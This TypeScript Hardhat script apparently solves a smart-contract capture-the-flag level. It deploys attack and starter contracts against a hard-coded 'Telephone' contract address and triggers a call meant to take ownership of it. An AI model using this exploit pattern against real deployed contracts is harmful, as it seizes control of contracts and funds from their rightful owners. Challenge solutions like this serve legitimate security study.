import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {
  Telephone,
  Telephone__factory,
  TelephoneAttack,
  TelephoneAttack__factory,
  TelephoneAttackStarter,
  TelephoneAttackStarter__factory,
} from "../typechain-types";

async function main() {
  let owner: SignerWithAddress;
  let TelephoneAttackInstance: TelephoneAttack;
  let TelephoneAttackStarterInstance: TelephoneAttackStarter;

  [owner] = await ethers.getSigners();

  // The contract we're taking ownership of
  const targetContractAddress = "0x15C3EB968D4bAA96129fC01BBaDF4Fd3e1a72997";

  // Deploying attack Contract
  const TeleponeAttackFactory = new TelephoneAttack__factory(owner);
  TelephoneAttackInstance = await TeleponeAttackFactory.deploy(
    targetContractAddress
  );
  await TelephoneAttackInstance.deployed();
  console.log(
    "TelephoneAttack contract deployed to: " + TelephoneAttackInstance.address
  );

  // Deploying our starter contract
  const TeleponeAttackStarterFactory = new TelephoneAttackStarter__factory(
    owner
  );
  TelephoneAttackStarterInstance = await TeleponeAttackStarterFactory.deploy(
    TelephoneAttackInstance.address
  );
  await TelephoneAttackStarterInstance.deployed();
  console.log(
    "TelephoneAttackStarter contract deployed to: " +
      TelephoneAttackStarterInstance.address
  );

  const attackTxn = await TelephoneAttackStarterInstance.attackTelephone();
  await attackTxn.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
